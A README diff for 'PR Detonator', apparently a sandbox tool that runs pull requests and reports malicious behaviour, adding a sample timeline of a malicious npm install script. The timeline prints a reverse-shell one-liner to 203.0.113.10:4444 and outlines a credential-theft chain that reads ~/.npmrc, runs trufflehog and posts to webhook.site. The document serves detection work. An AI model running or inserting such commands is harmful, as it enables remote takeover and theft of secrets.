@@ -63,6 +63,19 @@ spawns a reverse shell. PR Detonator's comment:
 > | 🟠 high | `NET_RAW_IP` | bash connected to 203.0.113.10:4444 with no DNS lookup |
 >
 > **Process tree:** `npm install → sh -c "node scripts/telemetry-optout.js" → node → bash -c "bash -i >& /dev/tcp/…"`
+>
+> ### What happened, in order
+> - `+0.00s` ▶ **npm** install started
+> - `+0.44s` 📜 **npm** ran the install script `node scripts/telemetry-optout.js`
+> - `+0.48s` ⚙ **bash** ran `-c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"`
+> - `+0.48s` 🌐 **bash** connected to `203.0.113.10:4444`
+
+That last section is the one a reviewer reads first. Four findings are a list; the same four
+facts in the kernel's own recorded order are an attack. For the Shai-Hulud reconstruction it
+reads: ran the install script → opened `~/.npmrc` → fetched a GitHub release → unpacked it →
+ran **trufflehog** over the workspace → `POST`ed to `webhook.site`, 3.9 s in. The ordering is
+the kernel's nanosecond timestamps, not a reconstruction, and the section is **report-only** —
+built after the verdict, so it can never change one.
 
 ## Architecture
 
@@ -249,7 +262,7 @@ demo/      scenario payloads for the demo repo
 
 ## Running it
 
-- **Tests:** `python -m pytest` (771 tests; fixtures recorded from real Tetragon, dnsmasq, firewall-log and model output)
+- **Tests:** `python -m pytest` (820 tests; fixtures recorded from real Tetragon, dnsmasq, firewall-log and model output)
 - **Chamber:** on Ubuntu 22.04+ with BTF: `sudo bash chamber/provision/setup.sh`
   (installs Tetragon, egress rules, sandbox image, and the systemd service; generates the HMAC secret)
 - **Brain:** create Modal secrets `github-app`, `llama`, `chamber`, `detonator-config`
